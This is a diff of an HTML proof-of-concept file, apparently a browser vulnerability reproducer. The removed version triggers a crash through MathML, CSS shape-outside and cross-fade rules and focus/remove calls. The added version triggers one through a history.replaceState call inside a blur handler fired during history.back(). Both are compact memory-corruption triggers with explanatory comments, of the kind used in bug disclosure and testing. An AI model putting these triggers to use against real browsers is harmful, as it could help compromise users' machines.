@@ -1,24 +1,30 @@
-<!-- saved from url=(0014)about:internet -->
 <html>
-<style>
-	.class1 { shape-outside: url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7); }
-	msub::first-line { background-image: cross-fade(url(abc), url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7), 50%);  }
-</style>
+<head>
+</head>
+<body>
 <script>
-	function trigger() {
-		document.getElementsByTagName("style")[0].appendChild(document.createElement("a")); 
-		setTimeout( () => {
-			msubEle.prepend("1");
-			mathEle.focus() // This can be a few different calls. setSelectionRange also worked
-			mathEle.remove();
-		}, 0);
-	}
+input = document.body.appendChild(document.createElement("input"));
+
+foo = document.body.appendChild(document.createElement("a"));
+foo.id = "foo";
+
+// Go to state1 when history.back is called
+// The URL needs to be <currentPage+hash> to trigger loadInSameDocument during the call to back()
+// Since the foo's element id="foo", focus will change to that element
+history.pushState("state1", "", location + "#foo");
+
+// Current state = state2
+history.pushState("state2", "");
+
+setTimeout(() => {
+
+        // Set the focus on the input element.
+        // During the call to back() the focus will change to the foo element 
+        // and therefore triggering the blur event on the input element
+        input.focus(); 
+        input.onblur = () => history.replaceState("state3", "");
+        setTimeout(() => history.back(), 1000);
+}, 1000);
 </script>
-<body onload=trigger()>
-	<math id="mathEle" class="class1">
-		<msub id="msubEle">
-			<mi></mi>
-		</msub>
-	</math>
 </body>
 </html>
